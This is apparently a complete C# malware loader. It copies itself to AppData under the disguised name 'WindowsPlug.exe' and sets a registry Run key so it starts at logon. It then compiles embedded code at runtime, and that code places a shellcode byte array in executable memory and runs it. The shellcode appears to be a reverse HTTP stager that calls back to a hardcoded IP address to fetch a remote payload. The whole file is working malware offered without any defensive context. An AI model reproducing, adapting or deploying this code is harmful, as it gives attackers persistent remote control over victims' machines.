using System;
using System.Reflection;
using System.CodeDom.Compiler;
using Microsoft.CSharp;
using System.Threading;
using System.Diagnostics;
using System.IO;

namespace youhacker
{
    class Program
    {

        static void Main(string[] args)
        {
            string code = @"
                            using System;
                            using System.Reflection;
                            using System.Runtime.InteropServices;

                            namespace youhackerunner
                            {
                                class Program
                                {
                                    private static UInt32 MEM_COMMIT = 0x1000;
                                    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

                                    [DllImport(""kernel32"")]
                                    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
                                            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

                                    [DllImport(""kernel32"")]
                                    private static extern IntPtr CreateThread(
                                        UInt32 lpThreadAttributes,
                                        UInt32 dwStackSize,
                                        UInt32 lpStartAddress,
                                        IntPtr param,
                                        UInt32 dwCreationFlags,
                                        ref UInt32 lpThreadId
                                        );

                                    [DllImport(""kernel32"")]
                                    private static extern UInt32 WaitForSingleObject(
                                        IntPtr hHandle,
                                        UInt32 dwMilliseconds
                                        );

                                    public void start()
                                    {
                                                                       
                                        byte[] coding = new byte[798] { 0xfc, 0xe8, 0x89, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xd2, 0x64, 0x8b, 0x52, 0x30, 0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf0, 0x52, 0x57, 0x8b, 0x52, 0x10, 0x8b, 0x42, 0x3c, 0x01, 0xd0, 0x8b, 0x40, 0x78, 0x85, 0xc0, 0x74, 0x4a, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x8b, 0x58, 0x20, 0x01, 0xd3, 0xe3, 0x3c, 0x49, 0x8b, 0x34, 0x8b, 0x01, 0xd6, 0x31, 0xff, 0x31, 0xc0, 0xac, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0x38, 0xe0, 0x75, 0xf4, 0x03, 0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75, 0xe2, 0x58, 0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b, 0x0c, 0x4b, 0x8b, 0x58, 0x1c, 0x01, 0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24, 0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a, 0x51, 0xff, 0xe0, 0x58, 0x5f, 0x5a, 0x8b, 0x12, 0xeb, 0x86, 0x5d, 0x68, 0x6e, 0x65, 0x74, 0x00, 0x68, 0x77, 0x69, 0x6e, 0x69, 0x54, 0x68, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x31, 0xff, 0x57, 0x57, 0x57, 0x57, 0x57, 0x68, 0x3a, 0x56, 0x79, 0xa7, 0xff, 0xd5, 0xe9, 0x84, 0x00, 0x00, 0x00, 0x5b, 0x31, 0xc9, 0x51, 0x51, 0x6a, 0x03, 0x51, 0x51, 0x68, 0x50, 0x00, 0x00, 0x00, 0x53, 0x50, 0x68, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0xeb, 0x70, 0x5b, 0x31, 0xd2, 0x52, 0x68, 0x00, 0x02, 0x40, 0x84, 0x52, 0x52, 0x52, 0x53, 0x52, 0x50, 0x68, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x89, 0xc6, 0x83, 0xc3, 0x50, 0x31, 0xff, 0x57, 0x57, 0x6a, 0xff, 0x53, 0x56, 0x68, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x84, 0xc3, 0x01, 0x00, 0x00, 0x31, 0xff, 0x85, 0xf6, 0x74, 0x04, 0x89, 0xf9, 0xeb, 0x09, 0x68, 0xaa, 0xc5, 0xe2, 0x5d, 0xff, 0xd5, 0x89, 0xc1, 0x68, 0x45, 0x21, 0x5e, 0x31, 0xff, 0xd5, 0x31, 0xff, 0x57, 0x6a, 0x07, 0x51, 0x56, 0x50, 0x68, 0xb7, 0x57, 0xe0, 0x0b, 0xff, 0xd5, 0xbf, 0x00, 0x2f, 0x00, 0x00, 0x39, 0xc7, 0x74, 0xb7, 0x31, 0xff, 0xe9, 0x91, 0x01, 0x00, 0x00, 0xe9, 0xc9, 0x01, 0x00, 0x00, 0xe8, 0x8b, 0xff, 0xff, 0xff, 0x2f, 0x59, 0x55, 0x6d, 0x41, 0x00, 0x28, 0xbb, 0x90, 0xc9, 0xc2, 0xa6, 0xc6, 0x1e, 0x31, 0xab, 0x3f, 0x2c, 0x63, 0x6f, 0xa6, 0xc1, 0x8b, 0xfa, 0x88, 0x44, 0x15, 0xa6, 0xd3, 0x85, 0xa8, 0xe5, 0xfd, 0x13, 0xb5, 0x1f, 0xda, 0x52, 0x77, 0x21, 0xbb, 0x2d, 0x7e, 0xa5, 0xd9, 0x60, 0xbe, 0xc0, 0x72, 0x73, 0x03, 0x78, 0xb0, 0x2f, 0x32, 0xe0, 0x6d, 0x33, 0xce, 0x7a, 0x7a, 0x97, 0xdb, 0x27, 0x03, 0x43, 0x5d, 0x81, 0xea, 0x7b, 0xbe, 0xc6, 0x36, 0xed, 0x69, 0x70, 0x0f, 0xe7, 0x4f, 0x00, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x34, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, 0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x37, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x35, 0x2e, 0x31, 0x3b, 0x20, 0x49, 0x6e, 0x66, 0x6f, 0x50, 0x61, 0x74, 0x68, 0x2e, 0x32, 0x3b, 0x20, 0x49, 0x6e, 0x66, 0x6f, 0x50, 0x61, 0x74, 0x68, 0x2e, 0x33, 0x29, 0x0d, 0x0a, 0x00, 0x08, 0x6a, 0x91, 0x6a, 0x83, 0xf8, 0x6e, 0x35, 0xc4, 0xe8, 0x3e, 0x3c, 0xd1, 0x9f, 0xb6, 0x5c, 0xf0, 0x4c, 0x5d, 0xa0, 0x51, 0x25, 0xc5, 0xf2, 0x8b, 0xbb, 0x83, 0x07, 0xcc, 0x3d, 0x2a, 0x05, 0xf2, 0x23, 0xa1, 0xae, 0x85, 0xbe, 0x46, 0x8d, 0xa9, 0x5f, 0xfd, 0x69, 0xaa, 0x66, 0x8b, 0x57, 0x38, 0x21, 0xf2, 0x06, 0x36, 0xf1, 0x8b, 0x8e, 0x67, 0xcf, 0x3c, 0x93, 0xa5, 0x17, 0x59, 0x19, 0xf0, 0xf7, 0xb9, 0x8f, 0x4d, 0x5e, 0x43, 0xbb, 0x8c, 0xa8, 0xdb, 0x81, 0xaa, 0xdd, 0x43, 0xf0, 0x03, 0x57, 0xd7, 0xcb, 0x39, 0x53, 0xa7, 0xb8, 0x7c, 0xe7, 0x70, 0x36, 0x39, 0x62, 0xeb, 0x7d, 0x3c, 0x73, 0x90, 0x91, 0x50, 0x58, 0xc3, 0x53, 0x51, 0xe1, 0xd1, 0x46, 0x73, 0x2b, 0x62, 0xb4, 0x90, 0xc4, 0x48, 0xfd, 0xfb, 0x61, 0xad, 0xdb, 0xd5, 0xde, 0x80, 0x04, 0x81, 0x54, 0x02, 0xaa, 0x07, 0x4d, 0xda, 0x0b, 0x43, 0x13, 0xe7, 0xf0, 0x45, 0x7e, 0x66, 0x12, 0x04, 0xea, 0x12, 0x0f, 0x93, 0x42, 0x5f, 0x00, 0x1b, 0xb3, 0x50, 0xe2, 0xec, 0x17, 0x4f, 0xee, 0xf4, 0xdc, 0x08, 0x43, 0x52, 0xb9, 0xc6, 0x9d, 0xd1, 0x75, 0xa6, 0x61, 0x66, 0x6d, 0xbd, 0x8c, 0xe2, 0xf4, 0x8e, 0x8f, 0x8d, 0xf1, 0xfe, 0xd4, 0x2e, 0x6e, 0x37, 0x48, 0x3a, 0x47, 0x2b, 0x34, 0x44, 0x8c, 0x71, 0x25, 0xde, 0x88, 0x4a, 0x2f, 0xf3, 0x36, 0x7d, 0xfa, 0x5d, 0x62, 0x85, 0x9d, 0xf6, 0xb3, 0xc8, 0x24, 0xee, 0x0a, 0x9d, 0x91, 0x88, 0x2f, 0x00, 0x68, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x6a, 0x40, 0x68, 0x00, 0x10, 0x00, 0x00, 0x68, 0x00, 0x00, 0x40, 0x00, 0x57, 0x68, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x93, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x01, 0xd9, 0x51, 0x53, 0x89, 0xe7, 0x57, 0x68, 0x00, 0x20, 0x00, 0x00, 0x53, 0x56, 0x68, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x85, 0xc0, 0x74, 0xc6, 0x8b, 0x07, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xe5, 0x58, 0xc3, 0xe8, 0xa9, 0xfd, 0xff, 0xff, 0x31, 0x39, 0x32, 0x2e, 0x31, 0x36, 0x38, 0x2e, 0x31, 0x2e, 0x31, 0x31, 0x36, 0x00, 0x12, 0x34, 0x56, 0x78 };
                                        UInt32 funcAddr = VirtualAlloc(0, (UInt32)coding.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                                        Marshal.Copy(coding, 0, (IntPtr)(funcAddr), coding.Length);
                                        IntPtr hThread = IntPtr.Zero;
                                        UInt32 threadId = 0;
                                        IntPtr pinfo = IntPtr.Zero;
                                        hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
                                        WaitForSingleObject(hThread, 0xFFFFFFFF);
                                    }
                                }
                            }";
            string ePath = Process.GetCurrentProcess().MainModule.FileName;
            string app = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            try
            {

                File.Copy(ePath, app + "\\WindowsPlug.exe", true);
            }
            catch (IOException iox)
            {

            }
            AddToStartup(app + "\\WindowsPlug.exe", "windowsservice");
            Thread.Sleep(4000);
            compile(code, "youhackerunner", "Program", "start", false, null);




        }

        public static void AddToStartup(string path, string servicename)
        {

            Microsoft.Win32.RegistryKey rkInstance = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            rkInstance.SetValue(servicename, path);
            rkInstance.Dispose();
            rkInstance.Close();
        }


        public static object compile(string code, string namespacename, string classname, string functionname, bool isstatic, params object[] args)
        {
            object returnval = null;
            Assembly asm = BuildAssembly(code);
            object instance = null;
            Type type = null;
            if (isstatic)
            {
                type = asm.GetType(namespacename + "." + classname);
            }
            else
            {
                instance = asm.CreateInstance(namespacename + "." + classname);
                type = instance.GetType();
            }
            MethodInfo method = type.GetMethod(functionname);
            returnval = method.Invoke(instance, args);
            return returnval;
        }

        private static Assembly BuildAssembly(string code)
        {
            Microsoft.CSharp.CSharpCodeProvider provider = new CSharpCodeProvider();
            ICodeCompiler compiler = provider.CreateCompiler();
            CompilerParameters compilerparams = new CompilerParameters();
            compilerparams.GenerateExecutable = false;
            compilerparams.GenerateInMemory = true;
            CompilerResults results = compiler.CompileAssemblyFromSource(compilerparams, code);
            return results.CompiledAssembly;
        }

    }
}
